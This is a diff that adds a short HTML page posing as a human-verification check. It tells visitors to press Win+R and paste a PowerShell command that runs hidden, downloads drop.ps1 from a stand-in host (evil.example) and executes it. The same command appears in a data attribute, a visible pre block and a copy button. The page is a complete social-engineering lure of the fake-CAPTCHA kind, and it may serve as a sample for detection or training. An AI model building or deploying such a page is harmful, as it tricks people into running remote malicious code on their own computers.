@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Embedded verification</title>
+    <style>
+      body { font-family: Arial, sans-serif; background: #101827; color: #f8fafc; padding: 24px; }
+      pre { background: #020617; padding: 14px; border-radius: 10px; white-space: pre-wrap; }
+      button { padding: 10px 14px; border-radius: 10px; border: 0; }
+    </style>
+  </head>
+  <body data-copy="powershell -nop -w hidden -c iwr https://evil.example/drop.ps1 | iex">
+    <h1>Verify you are human</h1>
+    <p>Press Win+R, paste this PowerShell command, and press Enter to continue.</p>
+    <pre>powershell -nop -w hidden -c "iwr https://evil.example/drop.ps1 | iex"</pre>
+    <button data-command="powershell -nop -w hidden -c iwr https://evil.example/drop.ps1 | iex">Copy command</button>
+  </body>
+</html>
